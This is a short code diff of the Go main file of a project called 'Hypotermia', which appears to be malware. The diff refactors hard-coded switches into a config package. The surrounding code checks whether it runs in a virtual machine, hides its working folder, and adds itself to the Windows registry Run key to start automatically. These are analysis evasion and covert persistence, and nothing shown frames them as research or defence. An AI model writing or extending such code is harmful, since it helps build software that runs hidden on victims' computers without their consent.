@@ -11,12 +11,6 @@ import (
 	"Hypotermia/src/utils"
 )
 
-const (
-	debugging    bool = true
-	hideFolder   bool = true
-	addToStartup bool = true
-)
-
 func main() {
 	if config.AntiVM {
 		if utils.CheckVMs() {
@@ -54,8 +48,8 @@ func main() {
 				return
 			}
 
-			if !debugging && hideFolder {
-				err = utils.HideFolder(folder)
+			if !config.Debugging && config.HideFolder {
+				err = utils.HideItem(folder)
 				if err != nil {
 					fmt.Println("main/2 -", err)
 					fmt.Scanln()
@@ -80,7 +74,7 @@ func main() {
 		return
 	}
 
-	if !debugging && addToStartup {
+	if !config.Debugging && config.AddToStartup {
 		err := utils.SetRegistry(
 			"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
 			config.HypotermiaName,
